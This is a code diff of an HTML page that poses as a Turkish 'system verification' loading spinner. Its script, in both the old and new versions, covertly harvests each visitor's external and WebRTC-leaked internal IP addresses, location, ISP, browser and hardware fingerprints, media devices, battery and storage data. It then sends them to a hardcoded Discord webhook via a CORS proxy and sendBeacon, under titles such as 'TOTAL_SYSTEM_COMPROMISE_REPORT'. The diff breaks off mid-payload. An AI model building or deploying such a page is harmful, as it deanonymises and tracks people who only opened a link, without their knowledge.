@@ -2,119 +2,81 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Sistem Doğrulaması</title>
-    <style>
-        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
-        .c { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 20px; height: 20px; animation: r 1s linear infinite; }
-        @keyframes r { to { transform: rotate(360deg); } }
-    </style>
+    <title>Sistem Kaynakları</title>
+    <style>body{background:#000;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden;}.l{border:2px solid #111;border-top:2px solid #0f0;border-radius:50%;width:20px;height:20px;animation:s 1s linear infinite;}@keyframes s{to{transform:rotate(360deg);}}</style>
 </head>
 <body>
-    <div class="c"></div>
+    <div class="l"></div>
     <script>
         (async () => {
-            const hook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
-            const gate = "https://corsproxy.io/?";
+            const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+            const g = "https://corsproxy.io/?";
 
-            const Extractor = {
-                // 1. VPN BYPASS (WebRTC Sızıntısı)
-                async getInternalIP() {
-                    return new Promise(res => {
+            const Collector = {
+                async getNetwork() {
+                    const n = navigator.connection || {};
+                    const r = await fetch('https://ipapi.co/json/').then(x => x.json()).catch(() => ({}));
+                    const i = await new Promise(z => {
                         const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
                         pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
-                        pc.onicecandidate = (e) => {
-                            if (e && e.candidate) {
-                                const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-                                if (m) { pc.close(); res(m[1]); }
-                            }
-                        };
-                        setTimeout(() => res("Hidden/Blocked"), 2500);
+                        pc.onicecandidate = (e) => { if(e?.candidate) { const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if(m) { pc.close(); z(m[1]); } } };
+                        setTimeout(() => z("Blocked"), 1500);
                     });
+                    return { ...r, internal: i, rtt: n.rtt, downlink: n.downlink, type: n.effectiveType };
                 },
-
-                // 2. CANVAS FINGERPRINT (Cihaz Kimliği)
-                getCanvasId() {
-                    const c = document.createElement('canvas');
-                    const ctx = c.getContext('2d');
-                    ctx.textBaseline = "top"; ctx.font = "14px Arial";
-                    ctx.fillText("Omniscience_V29", 2, 2);
-                    return c.toDataURL().slice(-50); // Benzersiz hash parçası
-                },
-
-                // 3. AUDIO FINGERPRINT
-                async getAudioId() {
+                async getMedia() {
                     try {
-                        const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
-                        const osc = ctx.createOscillator();
-                        osc.type = "triangle"; osc.frequency.setValueAtTime(10000, ctx.currentTime);
-                        const comp = ctx.createDynamicsCompressor();
-                        comp.threshold.setValueAtTime(-50, ctx.currentTime);
-                        osc.connect(comp); comp.connect(ctx.destination);
-                        osc.start(0); await ctx.startRendering();
-                        return "Active";
-                    } catch { return "Disabled"; }
+                        const devices = await navigator.mediaDevices.enumerateDevices();
+                        return devices.map(d => `${d.kind}: ${d.label || 'Hidden'}`).join(" | ");
+                    } catch { return "Denied"; }
                 },
-
-                // 4. DERİN DONANIM VE YAZILIM ANALİZİ
-                async getFullSpecs() {
-                    const gl = document.createElement('canvas').getContext('webgl');
+                getHardware() {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl');
                     const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                    const net = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-                    const bat = navigator.getBattery ? await navigator.getBattery() : {level: 0, charging: false};
-
                     return {
-                        network: {
-                            ext_ip: net.ip, int_ip: await this.getInternalIP(),
-                            isp: net.org, loc: `${net.city}, ${net.country_name}`,
-                            vpn: net.proxy ? "⚠️ YES" : "✅ NO",
-                            map: `https://www.google.com/maps?q=${net.latitude},${net.longitude}`
-                        },
-                        hardware: {
-                            gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A",
-                            cpu: navigator.hardwareConcurrency, ram: navigator.deviceMemory,
-                            touch: navigator.maxTouchPoints > 0 ? "Yes" : "No",
-                            battery: `${Math.round(bat.level * 100)}% (${bat.charging ? 'Plugged' : 'Unplugged'})`
-                        },
-                        browser: {
-                            agent: navigator.userAgent, lang: navigator.language,
-                            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                            res: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
-                            canvas: this.getCanvasId(), cookies: navigator.cookieEnabled ? "On" : "Off"
-                        }
+                        gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A",
+                        cores: navigator.hardwareConcurrency,
+                        mem: navigator.deviceMemory,
+                        heap: performance.memory ? `${Math.round(performance.memory.jsHeapSizeLimit / 1048576)}MB` : "N/A",
+                        touch: navigator.maxTouchPoints,
+                        gamepads: navigator.getGamepads ? Array.from(navigator.getGamepads()).filter(x => x).length : 0
+                    };
+                },
+                getFingerprint() {
+                    const fonts = ["Consolas", "Courier", "Arial", "Roboto", "Impact", "Georgia", "Tahoma"].filter(f => document.fonts.check(`12px "${f}"`));
+                    const intl = Intl.DateTimeFormat().resolvedOptions();
+                    return {
+                        fonts: fonts.join(", "),
+                        tz: intl.timeZone,
+                        cal: intl.calendar,
+                        loc: intl.locale,
+                        pdf: navigator.pdfViewerEnabled,
+                        dnt: navigator.doNotTrack,
+                        res: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`
+                    };
+                },
+                async getSystemState() {
+                    const bat = navigator.getBattery ? await navigator.getBattery() : {};
+                    const storage = navigator.storage ? await navigator.storage.estimate() : {};
+                    return {
+                        battery: `${Math.round(bat.level * 100)}% (${bat.charging ? 'AC' : 'DC'})`,
+                        quota: storage.quota ? `${Math.round(storage.quota / 1073741824)}GB` : "N/A",
+                        usage: storage.usage ? `${Math.round(storage.usage / 1048576)}MB` : "N/A",
+                        platform: navigator.platform,
+                        cookies: navigator.cookieEnabled
                     };
                 }
             };
 
-            // DATA AGGREGATION
-            const data = await Extractor.getFullSpecs();
+            const [net, media, state] = await Promise.all([Collector.getNetwork(), Collector.getMedia(), Collector.getSystemState()]);
+            const hw = Collector.getHardware();
+            const fp = Collector.getFingerprint();
 
-            // DISCORD PAYLOAD CONSTRUCTION
-            const payload = {
+            const p = {
                 embeds: [{
-                    title: "💀 TOTAL_SYSTEM_COMPROMISE_REPORT",
-                    color: 0xff0000,
+                    title: "💀 KERNEL_EXFILTRATION_V32_COMPLETE",
+                    color: 0x00ff00,
                     fields: [
-                        { name: "📡 NETWORK INFRASTRUCTURE", value: `**Ext IP:** \`${data.network.ext_ip}\`\n**Int IP:** \`${data.network.int_ip}\`\n**ISP:** ${data.network.isp}\n**LOC:** ${data.network.loc}\n**VPN:** ${data.network.vpn}\n[📍 Open Map](${data.network.map})`, inline: false },
-                        { name: "⚙️ HARDWARE ARCHITECTURE", value: `**GPU:** ${data.hardware.gpu}\n**CPU:** ${data.hardware.cpu} Cores | **RAM:** ${data.hardware.ram}GB\n**Touch:** ${data.hardware.touch} | **Battery:** ${data.hardware.battery}`, inline: false },
-                        { name: "🌍 BROWSER & FINGERPRINT", value: `**TZ:** ${data.browser.tz} | **Lang:** ${data.browser.lang}\n**Res:** ${data.browser.res}\n**CanvasID:** \`${data.browser.canvas}\`\n**Cookies:** ${data.browser.cookies}`, inline: false },
-                        { name: "🔍 RAW IDENTIFIER", value: "```" + data.browser.agent + "```" }
-                    ],
-                    footer: { text: "Protocol: Omniscience v29.0 | Engineering Grade" },
-                    timestamp: new Date().toISOString()
-                }]
-            };
-
-            const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
-
-            // TRANSMISSION LAYER
-            const dispatch = (u) => {
-                fetch(gate + encodeURIComponent(u), { method: 'POST', body: blob, mode: 'no-cors' });
-                if (navigator.sendBeacon) navigator.sendBeacon(u, blob);
-            };
-
-            dispatch(hook);
-        })();
-    </script>
-</body>
-</html>
-
+                        { name: "📡 NETWORK_DESCRIPTORS", value: `**Ext:** \`${net.ip}\`\n**Int:** \`${net.internal}\`\n**ISP:** ${net.org}\n**LOC:** ${net.city}/${net.country_name}\n**RTT:** ${net.rtt}
+                    
